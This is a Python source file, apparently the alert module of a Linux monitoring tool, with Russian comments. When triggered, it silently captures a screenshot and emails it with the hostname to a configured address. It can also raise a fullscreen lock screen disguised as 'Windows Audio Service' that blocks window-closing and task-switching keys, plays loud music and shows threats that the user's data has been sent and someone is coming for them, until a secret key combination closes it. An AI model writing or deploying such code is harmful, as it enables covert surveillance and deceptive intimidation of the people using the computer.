# linux_alert.py
import io
import socket
import smtplib
import threading
import time
import tkinter as tk
import os
import subprocess
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import linux_config as config

# Принудительно указываем драйвер звука для Linux (чтобы pygame играл музыку)
os.environ['SDL_AUDIODRIVER'] = 'pulseaudio' 

try:
    import pygame
except ImportError:
    pygame = None

try:
    import keyboard
except ImportError:
    keyboard = None

last_sent_times = {}
warning_window_active = False
last_alert_time_global = 0
music_playing = False
root_window = None

def play_alert_music():
    global music_playing
    if music_playing or not pygame: return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(config.MUSIC_FILE)
        pygame.mixer.music.set_volume(1.0)
        pygame.mixer.music.play(-1)
        music_playing = True
    except Exception as e:
        print(f"[МУЗЫКА] Ошибка: {e}")

def stop_alert_music():
    global music_playing
    if music_playing and pygame:
        try:
            pygame.mixer.music.stop()
            music_playing = False
        except Exception:
            pass

def show_scary_warning():
    global warning_window_active, root_window
    if warning_window_active: return
    warning_window_active = True

    try:
        root_window = tk.Tk()
        root_window.title("Windows Audio Service")
        root_window.attributes("-fullscreen", True)
        root_window.attributes("-topmost", True)
        root_window.configure(bg="#020000")

        root_window.protocol("WM_DELETE_WINDOW", lambda: None)
        root_window.bind("<Alt-F4>", lambda e: "break")

        keys_to_block = ['windows', 'alt+tab', 'alt+f4', 'ctrl+esc', 'alt+esc', 'ctrl+shift+esc']
        if keyboard:
            for key in keys_to_block:
                try:
                    keyboard.block_key(key)
                except Exception:
                    pass

        def close_window(event=None):
            global warning_window_active
            warning_window_active = False
            if keyboard:
                for key in keys_to_block:
                    try:
                        keyboard.unblock_key(key)
                    except Exception:
                        pass
            stop_alert_music()
            root_window.destroy()

        root_window.bind_all("<Alt-KeyPress-9>", close_window)

        red_flash = tk.Frame(root_window, bg="#ff0000")
        red_flash.place(relx=0, rely=0, relwidth=1, relheight=1)
        red_flash.lower()

        def flash_screen(count=0):
            if count % 2 == 0:
                red_flash.lift()
                root_window.after(30, lambda: red_flash.lower())
            root_window.after(2000, flash_screen, count + 1)
        flash_screen()

        scanlines = tk.Canvas(root_window, bg="#020000", highlightthickness=0)
        scanlines.place(relx=0, rely=0, relwidth=1, relheight=1)
        for i in range(0, 2000, 4):
            scanlines.create_line(0, i, 2000, i, fill="#0a0000", width=1)

        main_frame = tk.Frame(root_window, bg="#020000", highlightbackground="#ff0000", highlightthickness=3)
        main_frame.place(relx=0.5, rely=0.5, anchor="center")

        top_bar = tk.Frame(main_frame, bg="#0a0000", pady=5)
        top_bar.pack(fill="x", pady=(0, 20))
        
        rec_label = tk.Label(top_bar, text="● LIVE | SYSTEM_OVERRIDE_ACTIVE", font=("Consolas", 18, "bold"), fg="#ff0000", bg="#0a0000")
        rec_label.pack()

        def blink_rec():
            if rec_label.cget("fg") == "#ff0000":
                rec_label.config(fg="#0a0000")
            else:
                rec_label.config(fg="#ff0000")
            root_window.after(400, blink_rec)
        blink_rec()

        tk.Label(main_frame, text="ACCESS DENIED", font=("Arial Black", 64, "bold"), fg="#ff0000", bg="#020000").pack(pady=(20, 0))
        
        text_container = tk.Frame(main_frame, bg="#020000")
        text_container.pack(pady=40)
        
        tk.Label(text_container, text="Ну всё, братишка - ты доигрался)", font=("Impact", 48), fg="#ffffff", bg="#020000").pack()
        tk.Label(text_container, text="ЗА ТОБОЙ УЖЕ ИДУТ.", font=("Impact", 64), fg="#ff0000", bg="#020000").pack(pady=(10, 0))

        glow_frame = tk.Frame(main_frame, bg="#ff0000", bd=0)
        glow_frame.pack(pady=30, ipadx=3, ipady=3)

        player_frame = tk.Frame(glow_frame, bg="#050000")
        player_frame.pack(fill="both", expand=True)

        tk.Label(player_frame, text="♫", font=("Arial", 36, "bold"), fg="#ff0000", bg="#050000").grid(row=0, column=0, rowspan=2, padx=(20, 15), pady=15)
        tk.Label(player_frame, text="Inner Circle - Bad Boys (Theme From Cops)", font=("Consolas", 16, "bold"), fg="#00ff00", bg="#050000").grid(row=0, column=1, sticky="w", padx=(0, 20), pady=(10, 0))
        tk.Label(player_frame, text="[АУДИО-СИСТЕМА]: ВЗЛОМАНА | ГРОМКОСТЬ 100%", font=("Consolas", 11), fg="#ff3333", bg="#050000").grid(row=1, column=1, sticky="w", padx=(0, 20), pady=(0, 10))

        slider_canvas = tk.Canvas(player_frame, width=500, height=12, bg="#1a0000", highlightthickness=0)
        slider_canvas.grid(row=2, column=0, columnspan=2, pady=(5, 15), padx=20, sticky="we")
        
        progress_rect = slider_canvas.create_rectangle(0, 0, 200, 12, fill="#ff0000", outline="")
        
        def animate_progress(offset=0):
            if not warning_window_active: return
            slider_canvas.coords(progress_rect, offset, 0, offset + 200, 12)
            new_offset = offset + 10
            if new_offset > 500: new_offset = 0
            root_window.after(25, animate_progress, new_offset)
        
        animate_progress()

        for widget in (glow_frame, player_frame, slider_canvas):
            widget.bind("<Button-1>", lambda e: "break")

        tk.Label(main_frame, text=f"> ДАННЫЕ ОТПРАВЛЕНЫ АДМИНИСТРАТОРУ\n> ПК: {socket.gethostname()}", font=("Consolas", 14, "bold"), fg="#666666", bg="#020000", justify="left").pack(pady=(10, 20), fill="x", padx=20)

        play_alert_music()

        root_window.focus_force()
        root_window.grab_set()
        root_window.mainloop()
    except Exception as e:
        print(f"[ОШИБКА ОКНА]: {e}")
        warning_window_active = False
        stop_alert_music()

# === СКРИНШОТ ДЛЯ LINUX ===
def capture_screenshot_bytes():
    tmp_path = "/tmp/block_screen.png"
    
    # Пробуем разные утилиты для скриншота (что установлено в системе)
    commands = [
        ["gnome-screenshot", "-f", tmp_path],  # Для GNOME
        ["scrot", tmp_path],                   # Для XFCE/KDE
        ["spectacle", "-b", "-n", "-o", tmp_path] # Для KDE
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL, timeout=5)
            if os.path.exists(tmp_path):
                with open(tmp_path, "rb") as f:
                    img_bytes = f.read()
                os.remove(tmp_path)
                return img_bytes
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            continue

    print("[СКРИНШОТ] Не удалось сделать скриншот. Установи scrot: sudo apt install scrot")
    return None

def _send_email_task(subject, body_text, screenshot_bytes):
    pc_name = socket.gethostname()
    msg = MIMEMultipart()
    msg["From"] = config.SENDER
    msg["To"] = config.RECIPIENT
    msg["Subject"] = f"[{pc_name}] {subject}"
    msg.attach(MIMEText(f"Имя ПК: {pc_name}\n{body_text}", "plain", "utf-8"))

    if screenshot_bytes:
        msg.attach(MIMEImage(screenshot_bytes, name="screenshot.jpg"))

    try:
        with smtplib.SMTP_SSL(config.SMTP_SERVER, config.SMTP_PORT, timeout=15) as server:
            server.login(config.SENDER, config.PASSWORD)
            server.send_message(msg)
    except Exception as e:
        print(f"[ПОЧТА] Ошибка: {e}")

def trigger_alert(timer_key, subject, body_text, show_warning=False):
    global last_alert_time_global
    current_time = time.time()

    if current_time - last_sent_times.get(timer_key, 0) < 30:
        return
    last_sent_times[timer_key] = current_time

    if show_warning and (current_time - last_alert_time_global < 2):
        show_warning = False
    if show_warning:
        last_alert_time_global = current_time

    screenshot_bytes = capture_screenshot_bytes()

    if show_warning:
        def run_window():
            show_scary_warning()
        threading.Thread(target=run_window, daemon=True).start()

    threading.Thread(target=_send_email_task, args=(subject, body_text, screenshot_bytes), daemon=True).start()